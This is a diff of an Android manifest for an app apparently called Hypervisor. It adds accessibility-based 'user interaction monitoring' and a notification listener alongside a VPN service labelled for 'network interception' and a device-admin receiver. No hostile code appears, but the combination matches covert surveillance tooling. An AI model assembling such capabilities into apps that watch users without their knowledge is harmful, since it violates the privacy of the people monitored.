@@ -27,14 +27,9 @@
     <!-- WiFi Security Analysis Permissions -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
     <uses-permission android:name="android.permission.NEARBY_WIFI_DEVICES" />
     <uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS" />
-
-    <!-- Packet capture and analysis -->
-    <uses-permission android:name="android.permission.BIND_VPN_SERVICE" />
-    <uses-permission android:name="android.permission.INTERNET" />
 
     <!-- Existing permissions... -->
 
@@ -120,19 +115,9 @@
             </intent-filter>
         </activity>
 
-        <!-- Security Monitoring Service -->
-        <service
-            android:name=".service.SecurityMonitoringService"
-            android:exported="false"
-            android:foregroundServiceType="specialUse">
-            <property
-                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
-                android:value="security_monitoring" />
-        </service>
-
         <!-- VPN Service for Network Interception -->
         <service
-            android:name=".service.HypervisorVpnService"
+            android:name=".HypervisorVpnService"
             android:permission="android.permission.BIND_VPN_SERVICE"
             android:exported="true">
             <intent-filter>
@@ -140,9 +125,32 @@
             </intent-filter>
         </service>
 
+        <!-- Accessibility Service for User Interaction Monitoring -->
+        <service
+            android:name=".HypervisorAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <!-- Notification Listener Service -->
+        <service
+            android:name=".HypervisorNotificationListener"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
         <!-- Device Admin Receiver -->
         <receiver
-            android:name=".security.AntiTamperingService$FortressDeviceAdminReceiver"
+            android:name=".HypervisorDeviceAdmin"
             android:exported="true"
             android:permission="android.permission.BIND_DEVICE_ADMIN">
             <intent-filter>
